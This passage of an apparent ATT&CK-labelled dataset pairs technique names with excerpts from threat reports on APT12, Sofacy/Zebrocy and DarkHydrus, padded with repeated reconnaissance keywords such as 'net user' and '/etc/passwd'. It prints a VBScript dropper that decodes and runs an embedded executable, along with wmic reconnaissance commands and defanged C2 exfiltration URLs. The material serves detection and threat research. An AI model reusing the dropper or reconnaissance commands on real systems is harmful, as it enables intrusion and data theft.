      "GET /<string>/<5 digit number>/<4 character string>.php?<first 3 characters of last string>_id=<43 character string>= HTTP/1.1 Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E) Host: <C2 Location> Cache-Control: no-cache    Figure 6: Sample GET request for WATERSPOUT backdoor Although there are no current infrastructure ties to link this backdoor to APT12, there are several data points that show a possible tie to the same actors:  Same initial delivery method (spear phishing email) with a Microsoft Word Document exploiting CVE-2012-0158"
    ]
  },
  "security software discovery data from local system-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "data from local system"
    ],
    "sentances": [
      "Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia-Pacific Region that are of Interest to China   The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors:  C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\winword.exe   WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor"
    ]
  },
  "impair defenses: disable or modify tools": [
    "Figure\u00a06 Relational diagram of artifacts\u00a0 We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3",
    "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16",
    "From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool \u201cDNSMessenger\u201d  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity",
    "- There were two interesting sub-classes found inside Main Activity: Receiver\u00a0and\u00a0Sender",
    "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)"
  ],
  "data from local system file and directory discovery-multi": {
    "technique_names": [
      "data from local system",
      "file and directory discovery"
    ],
    "sentances": [
      "Filename Created On Last Modified First Seen Total Time (In Days)   Passport.docx instruction.docx 9/11/18 04:22 10/13/18 08:21 10/18/18 07:38 37.1   DN_325_170428_DEA\u2026invitation.docx 9/11/18 04:22 10/13/18 08:21 10/25/18 08:15 44.12   crash list(Lion Air Boeing 737).docx \u0411\u0443\u0440\u0445\u0430\u043d\u043e\u0432.docx 9/11/18 04:22 10/13/18 08:21 11/01/18 06:50 51.1   \u0417\u0430\u044f\u0432\u043b\u0435\u043d\u0438\u0435.docx 9/11/18 04:22 10/13/18 08:21 11/01/18 11:41 51.3   1500029.docx 10/18/18 06:59 10/18/18 07:00 10/18/18 08:47 0.4   2018_10_13_17_15_21.docx 10/18/18 06:59 10/18/18 07:00 10/24/18 07:38 6.2   Rocket attacks on Israel.docx 11/13/18 12:17 11/13/18 10:46 11/14/18 05:14 0.7   Brexit 15.11.2018.docx DIP 89 OIC Condemns 14 Nov Attacks.docx 15.11 attacks.docx 11/14/18 14:17 11/15/18 04:50 11/15/18 06:28 0.8   201811131257.docx 11/14/18 14:33 11/15/18 04:50 11/15/18 12:31 0.9    Table 3 Timestamps of delivery documents (all times in UTC)  Figure 7 Dear Joohn timeline Based off the timestamps we have, four delivery documents were initially created on September 11, 2018 04:22 UTC"
    ]
  },
  "timestomp system time discovery-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "system time discovery"
    ],
    "sentances": [
      "When comparing the provided timestamps of the delivery documents to the timestamps for the remote template documents from Table 2, we find that the time to attack is directly correlated to the last time the templates are modified",
      "The Trojan compares the TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East, which will match the following time zones in Windows: \u00a0 Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5) According to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or +4 as seen in Figure 3"
    ]
  },
  "scripting obfuscated files or information-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "obfuscated files or information"
    ],
    "sentances": [
      "The Payloads The delivery documents in this attack campaign loaded remote templates whose macros installed a variety of first-stage payloads",
      "The last query is to the subdomain ihc[.]stage[.]12019683[.]ns2[.]true-deals[.]com): \u00a0 The delivered second stage shellcode is encrypted:  METERPRETER: After decryption of the second stage shellcode, the shellcode deletes the \u2018MZ\u2019 prefix from within a very important part of the shellcode",
      "SCT File Analysis The code of the Defender.sct file is an obfuscated JavaScript",
      "Analysis starts with a zlib decompression (a standard action of HWP documents) and we're able to recover the following script:const strEncode = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hV[...redacted...]AAAAAAAAAAAAAAAAAAAAAA=\"DIM outFileDIM base64DecodedDIM shell_objSET shell_obj = CreateObject(\"WScript.Shell\")DIM fsoSET fso = CreateObject(\"Scripting.FileSystemObject\")outFile = \"c:\\ProgramData\\HncModuleUpdate.exe\"base64Decoded = decodeBase64(strEncode)IF NOT(fso.FileExists(outFile)) thenwriteBytes outFile, base64Decodedshell_obj.run outFileEND IFWScript.Quit()private function decodeBase64(base64)DIM DM, ELSET DM = CreateObject(\"Microsoft.XMLDOM\")SET EL = DM.createElement(\"tmp\")EL.DataType = \"bin.base64\"EL.Text = base64decodeBase64 = EL.NodeTypedValueend functionprivate Sub writeBytes(file, bytes)DIM binaryStreamSET binaryStream = CreateObject(\"ADODB.Stream\")binaryStream.Type = 1binaryStream.OpenbinaryStream.Write bytesbinaryStream.SaveToFile file, 1End SubThis script is executed and is used to decode a static base64 string within the strEncode variable"
    ]
  },
  "account discovery": [
    "SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.",
    "ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com;\u00a0strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account:\u00a0adrian.1987clark@yahoo.com",
    "Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths",
    "This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data",
    "AutoFocus customers may learn more from the DarkHydrus tag  IOC Related SHA256 Hashes Payloads cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1 ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4 a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88 d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81 c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3 ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00 99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c Delivery documents d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318 8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde 9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49 cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9 0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1 0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82 870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8 ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0 01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2 6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a 47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870 776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4 cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0 e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678 26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245 b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350 ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c Related Domains maccaffe[.]com cisc0[.]net 0utl00k[.]net msdncss[.]com 0ffice[.]com 0ffiice[.]com micrrosoft[.]net anyconnect[.]stream bigip[.]stream  fortiweb[.]download  kaspersky[.]science  microtik[.]stream  owa365[.]bid  symanteclive[.]download  windowsdefender[.]win allexa[.]net kaspersky[.]host hotmai1[.]com 0utlook[.]bid",
    "Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc",
    "IOCs Domain supservermgr[.]com URL hxxp://supservermgr[.]com/sys/upd/pageupd.php Zebrocy d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df 25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d Koadic abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca User Agents Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 IPs 185.25.51[.]198 185.25.50[.]93 220.158.216[.]127 92.114.92[.]102 86.106.131[.]177  DDE Docs 85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff",
    "Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network",
    "It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system",
    "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain",
    "The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information",
    "The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    "net user ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net group ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " net localgroup ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " /etc/passwd ",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    " Get-MsolRoleMember",
    "Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior."
  ],
  "system information discovery process discovery data encoding-multi": {
    "technique_names": [
      "system information discovery",
      "process discovery",
      "data encoding"
    ],
    "sentances": [
      "The VB.NET variant then gathers system information and running processes like other Zebrocy variants by running the following commands: systeminfo & tasklist The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php?res=[serial number] The VB.NET variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows (notice the spaces before and after ampersand \u201c&\u201d): data=[system information and running processes] & arg=[screenshot in BMP format] C# Zebrocy Variant The C# variant of Zebrocy is similar to other variants in functionality, but also has several unique attributes that are worth discussing"
    ]
  },
  "windows management instrumentation process discovery exfiltration over command and control channel-multi": {
    "technique_names": [
      "windows management instrumentation",
      "process discovery",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "The tool runs the following list of WMI queries:  wmic logicaldisk get Caption, Description,VolumeSerialNumber,Size,FreeSpace wmic diskdrive get Model, SerialNumber wmic computersystem get Manufacturer, Model, Name, SystemTypec wmic os get Caption, OSArchitecture, OSLanguage,SystemDrive,MUILanguages wmic process get Caption,ExecutablePath  The URL used to send the system information, running processes and a screenshot to the C2 server is: hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php?fm=[serial number] The C# variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows: spp=[system information from WMI queries] &spvg=[screenshot in JPEG format] Conclusion The Sofacy group continues their attacks on organizations across the globe using similar tactics and techniques"
    ]
  },
  "spearphishing link standard application layer protocol spearphishing attachment fallback channels-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "application layer protocol",
      "phishing: spearphishing attachment",
      "fallback channels"
    ],
    "sentances": [
      "Palo Alto Networks customers are protected by attacks discussed in this blog by:  All delivery documents and payloads discussed are detected with malicious verdicts in WildFire Traps blocks the macro laden documents as Suspicious macro detected \u00a0C2 URLs have been classified as Command and Control AutoFocus customers may learn more via the Zebrocy and Cannon tags  Indicators of Compromise Delivery Hashes 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f c20e5d56b35992fe74e92aebb09c40a9ec4f3d9b3c2a01efbe761fa7921dd97f abfc14f7f708f662046bfcad81a719c71a35a8dc5aa111407c2c93496e52db74 40318f3593bca859673827b88d65c5d2f0d80a76948be936a60bda67dff27be9 5749eb9d7b8afa278be24a4db66f122aeb323eaa73a9c9e52d77ac3952da5e7d af77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392 34bdb5b364358a07f598da4d26b30bac37e139a7dc2b9914debb3a16311f3ded 79bd5f34867229176869572a027bd601bd8c0bc3f56d37443d403a6d1819a7e5 77ff53211bd994293400cb3f93e3d3df6754d8d477cb76f52221704adebad83a Remote Template Hashes f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5 86bb3b00bcd4878b081e4e4f126bba321b81a17e544d54377a0f590f95209e46 2da5a388b891e42df4ed62cffbc167db2021e2441e6075d651ecc1d0ffd32ec8 0d7b945b9c912d205974f44e3742c696b5038c2120ed4775710ed6d51fbc58ef fc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d ed8f52cdfc5f4c4be95a6b2e935661e00b50324bee5fe8974599743ccfd8daba b9f3af84a69cd39e2e10a86207f8612dd2839873c5839af533ffbc45fc56f809 Remote Template URLs hxxp://188.241.58[.]170/live/owa/office.dotm hxxp://185.203.118[.]198/documents/Note_template.dotm hxxp://185.203.118[.]198/documents/Note_template.dotm hxxp://145.249.105[.]165/doc/temp/release.dotm hxxp://145.249.105[.]165/messages/content/message_template.dotm hxxp://188.241.58[.]170/version/in/documents.dotm hxxp://109.248.148[.]42/officeDocument/2006/relationships/templates.dotm hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm hxxp://109.248.148[.]42/office/thememl/2012/main/attachedTemplate.dotm Zebrocy\u00a0Hashes 5173721f3054b92e6c0ff2a6a80e4741aa3639bc1906d8b615c3b014a7a1a8d7 61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a 9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9 b41480d685a961ed033b932d9c363c2a08ad60af1d2b46d4f78b5469dc5d58e3 c91843a69dcf3fdad0dac1b2f0139d1bb072787a1cfcf7b6e34a96bc3c081d65 e5aece694d740ebcb107921e890cccc5d7e8f42471f1c4ce108ecb5170ea1e92 Zebrocy\u00a0C2 URLs hxxp://188.241.58[.]170/local/s3/filters.php hxxp://185.203.118[.]198/en_action_device/center_correct_customer/drivers-i7-x86.php hxxp://145.249.105[.]165/resource-store/stockroom-center-service/check.php hxxp://109.248.148[.]42/agr-enum/progress-inform/cube.php Cannon Hashes 861b6bc1f9869017c48930af5848930dd037fb70fc506d8a7e43e1a0dbd1e8cb 4405cfbf28e0dfafa9ea292e494f385592383d2476a9c49d12596b8d22a63c47 174effcdeec0b84c67d7dc23351418f6fa4825550d595344214cc746f1a01c1a a23261e2b693750a7009569df96ec4cf61e57acc9424c98d6fe1087ff8c659ce 651d5aab82e53711563ce074c047cbaa0703931673fa3ad20933d6a63c5c3b12 68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24 61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e 5a02d4e5f6d6a89ad41554295114506540f0876e7288464e4a70c9ba51d24f12 d06be83a408f4796616b1c446e3637009d7691c131d121eb165c55bdd5ba50b4 